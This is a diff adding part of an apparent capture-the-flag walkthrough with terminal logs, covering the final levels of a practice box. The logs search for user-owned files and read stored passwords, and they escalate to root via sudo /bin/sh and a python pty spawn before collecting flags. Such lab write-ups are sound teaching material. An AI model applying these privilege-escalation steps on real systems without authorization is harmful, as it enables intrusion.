@@ -569,3 +569,124 @@ $ cat .viminfo
         *       1591364647      0
         "       1       0
 ```
+
+
+```
+level5@main:/usr/games$ find / -type f -user level5 2>/dev/null
+/bin/what
+/var/backup/test.txt
+/var/backup/backup.sh
+/tmp/linpeas.sh
+/proc/1590/task/1590/fdinfo/0
+/proc/1590/task/1590/fdinfo/1
+/proc/1590/task/1590/fdinfo/2
+
+```
+```
+level5@main:/usr/games$ cat /bin/what
+level 6 pass: <pass>
+
+level5@main:/usr/games$
+```
+
+
+
+```
+level6@main:~$ ls -al
+total 32
+drwx------  2 level6 level6 4096 Jul 31 11:21 .
+drwxr-xr-x 10 root   root   4096 Oct  8  2019 ..
+-rw-------  1 level6 level6   59 Jul 31 11:21 .bash_history
+-rw-r--r--  1 level6 level6  220 Apr  4  2018 .bash_logout
+-rw-r--r--  1 level6 level6 3771 Apr  4  2018 .bashrc
+-rw-r--r--  1 level6 level6   30 Oct  8  2019 flag78
+-rw-r--r--  1 level6 level6   50 Oct  8  2019 hey_listen
+-rw-r--r--  1 level6 level6  807 Apr  4  2018 .profile
+level6@main:~$ vim hey_listen
+
+
+main password: <pass>
+```
+
+
+```
+main@main:/home/level6$ whoami
+main
+main@main:/home/level6$
+```
+
+
+# 79
+```
+main@main:/home/level6$ cd /home/main/
+main@main:~$ ls -al
+total 40
+drwx------  4 main main 4096 Oct  8  2019 .
+drwxr-xr-x 10 root root 4096 Oct  8  2019 ..
+-rw-------  1 main main    8 Oct  8  2019 .bash_history
+-rw-r--r--  1 main main  220 Apr  4  2018 .bash_logout
+-rw-r--r--  1 main main 3771 Apr  4  2018 .bashrc
+drwx------  2 main main 4096 Oct  8  2019 .cache
+-rw-r--r--  1 main main   30 Oct  8  2019 flag79
+drwx------  3 main main 4096 Oct  8  2019 .gnupg
+-rw-r--r--  1 root root  982 Oct  8  2019 knock.py
+-rw-r--r--  1 main main  807 Apr  4  2018 .profile
+-rw-r--r--  1 main main    0 Oct  8  2019 .sudo_as_admin_successful
+main@main:~$ cat flag79
+```
+
+
+# 80
+```
+main@main:~$ sudo -l
+[sudo] password for main:
+Sorry, try again.
+[sudo] password for main:
+Matching Defaults entries for main on main:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User main may run the following commands on main:
+    (ALL : ALL) ALL
+main@main:~$ sudo /bin/sh
+# whoami
+root
+# cd /root/
+# ls -al
+total 40
+drwx------  5 root root 4096 Oct  8  2019 .
+drwxr-xr-x 24 root root 4096 Oct  8  2019 ..
+-rw-------  1 root root  471 Oct  8  2019 .bash_history
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwxr-xr-x  2 root root 4096 Oct  8  2019 hello_there
+drwxr-xr-x  3 root root 4096 Oct  8  2019 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   66 Oct  8  2019 .selected_editor
+drwx------  2 root root 4096 Oct  8  2019 .ssh
+-rw-------  1 root root 1939 Oct  8  2019 .viminfo
+# python -c 'import pty; pty.spawn("/bin/bash")'
+root@main:/root# cat hello_there/
+cat: hello_there/: Is a directory
+root@main:/root# cd hello_there/
+root@main:/root/hello_there# ls -al
+total 12
+drwxr-xr-x 2 root root 4096 Oct  8  2019 .
+drwx------ 5 root root 4096 Oct  8  2019 ..
+-rw-r--r-- 1 root root  120 Oct  8  2019 message_by_author
+root@main:/root/hello_there# cat message_by_author
+Congratulation, you are now completed the 100 CTF challenge
+
+Here, enjoy your last flag.
+
+Flag80: <flag>
+
+root@main:/root/hello_there#
+```
+
+# 75
+```
+root@main:/root/hello_there# cd /home/level3
+root@main:/home/level3# ls
+flag75
+root@main:/home/level3# cat flag75
+```
